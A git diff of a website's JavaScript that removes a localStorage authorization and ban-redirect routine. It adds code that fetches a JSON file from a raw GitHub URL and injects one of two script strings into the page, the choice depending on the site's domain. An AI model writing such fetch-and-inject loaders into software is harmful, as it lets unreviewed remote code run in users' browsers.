@@ -173,120 +173,30 @@ async function loadfont(fontId) {
     }
 
     // Generate a unique incident ID
-    function generateIncidentID() {
-        return `incident_${Date.now()}`;
-    }
 
-    // Get authorization data from localStorage
-    function getAuthData() {
-        return JSON.parse(localStorage.getItem('auth')) || {};
-    }
 
-    // Main script logic
-    async function executeScript() {
-        console.log("Starting main script logic...");
-
-        // Retrieve auth data
-        const authData = getAuthData();
-        console.log("Auth Data:", authData);
-
-        const config = await fetchConfig();
-        if (!config) {
-            console.error("Failed to fetch configuration JSON.");
-            return;
-        }
-
-        // Check if authData is not valid or does not exist
-        if (!authData || typeof authData.auth_valid === 'undefined' || authData.auth_valid === '') {
-            console.log("No valid authorization data found. Redirecting to authorization page...");
-            const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
-            console.warn("Redirecting to verification URL:", redirectUrl);
-            window.location.href = redirectUrl;
-            return;
-        }
-
-        // Determine actual value of auth_valid
-        const authValidValue = (authData.auth_valid === 'true' || authData.auth_valid === true);
-        const authInvalidValue = (authData.auth_valid === 'false' || authData.auth_valid === false);
-
-        // Handle based on the validity
-        if (!authValidValue && authInvalidValue) {
-            console.log("Authorization is invalid.");
-
-            if (authData.auth_invalid_reason) {
-                console.log("User is banned. Redirecting to ban website...");
-                const ip = await fetchPublicIP();  // Get user's IP address
-
-                const payload = {
-                    data: authData.auth_invalid_reason || 'User is banned',
-                    ip: ip,
-                    incidentid: generateIncidentID(),
-                    pageaccesurl: window.location.href
-                };
-
-                const banUrl = `${config.redirect_url.normal}?${new URLSearchParams(payload).toString()}`;
-                console.warn("Redirecting to ban URL:", banUrl);
-                window.location.href = banUrl;  // Perform the redirect
-                return;
-            } else {
-                console.log("User needs to authorize. Redirecting to authorization page...");
-                const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
-                console.warn("Redirecting to verification URL:", redirectUrl);
-                window.location.href = redirectUrl;  // Correct redirect for authorization
-                return;
-            }
-        }
-
-        // Check if the auth has expired or is null
-        const now = Date.now();
-        if (!authData.expire_at || authData.expire_at <= now) {
-            console.log("User authorization has expired or value is null. Redirecting to verification page...");
-            const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
-            console.warn("Redirecting to verification URL:", redirectUrl);
-            window.location.href = redirectUrl;  // Redirect to authorization
-            return;
-        }
-
-        // If authorized, you can insert additional scripts here
-        console.log("Authorization is valid.");
-        // Execute other scripts or logic here if necessary
-    }
-
+(async () => {
     // Ensure to run the script only on the correct domain
     const currentDomain = window.location.hostname;
-    if (currentDomain === "drmineword.github.io") {
-        console.log("Domain is correct. Executing script...");
-	
-	fetch('https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/run_script.json')
-            .then(response => {
-                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-                return response.json();
-            })
-            .then(data => {
-                const scriptContent = data.data1; // Extract content from data1
-                const scriptElement = document.createElement('script');
-                scriptElement.textContent = scriptContent; // Inject the script content
-                document.body.appendChild(scriptElement); // Append it to the DOM to execute
-            })
-            .catch(error => console.error('Error fetching script from data1:', error))
+    const url = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/run_script.json';
 
-        await executeScript();
-    } else {
-        console.log("Domain is incorrect. Skipping execution.");
-	fetch('https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/run_script.json')
-            .then(response => {
-                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-                return response.json();
-            })
-            .then(data => {
-                const scriptContent = data.data2; // Extract content from data2
-                const scriptElement = document.createElement('script');
-                scriptElement.textContent = scriptContent; // Inject the script content
-                document.body.appendChild(scriptElement); // Append it to the DOM to execute
-            })
-            .catch(error => console.error('Error fetching script from data2:', error));
+    try {
+        console.log(`Checking domain: ${currentDomain}`);
+        const response = await fetch(url);
+        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+
+        const data = await response.json();
+        const scriptContent = currentDomain === "drmineword.github.io" ? data.data1 : data.data2;
+
+        console.log("Executing script...");
+        const scriptElement = document.createElement('script');
+        scriptElement.textContent = scriptContent; // Inject the script content
+        document.body.appendChild(scriptElement); // Append it to the DOM to execute
+    } catch (error) {
+        console.error('Error fetching script:', error);
     }
 })();
+
 
 
 
